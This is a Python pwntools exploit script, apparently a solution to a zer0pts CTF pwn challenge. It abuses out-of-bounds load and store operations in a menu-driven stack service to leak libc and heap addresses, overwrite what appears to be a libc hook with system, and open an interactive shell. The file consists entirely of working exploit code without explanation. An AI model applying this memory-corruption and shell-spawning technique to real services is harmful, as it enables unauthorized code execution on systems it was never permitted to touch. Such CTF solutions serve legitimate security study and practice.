from pwn import *

HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'pwn.ctf.zer0pts.com', 9001

r = remote(HOST, PORT)
menu = lambda: r.recvuntil('>> ')
go = lambda x: [menu(), r.sendline(str(x))]

def push(value):
  r.sendline(str(1))
  r.sendline(str(value))

def pop():
  r.sendline(str(2))

def load(index):
  go(4)
  r.sendline(str(index))
  r.recvuntil('value: ')
  return int(r.recvline())

def load8(index):
  return load(index) + load(index + 1) * 2 ** 32

def store(index, value):
  go(3)
  r.sendline(str(index))
  r.sendline(str(value))

def store8(index, value):
  store(index, value & 0xffffffff)
  store(index + 1, value >> 32)

def wipe():
  go(5)

l = 0x804 >> 2
for i in range(l):
  push(0)

for i in range(l + 19367):
  pop()

for i in range(l * 2 + 19367):
  menu()

libc = load8(-516) - 0x1ebbe0
print(hex(libc))

heap = load8(-19366)
print(hex(heap))

store8(-19366, libc + 0x1eeb28 - 0x8)
wipe()
pause()

system = libc + 0x55410
pause()

push(u32('sh\x00\x00'))
push(0)

push(system & 0xffffffff)
push(system >> 32)

for i in range(5):
  push(0)

r.interactive()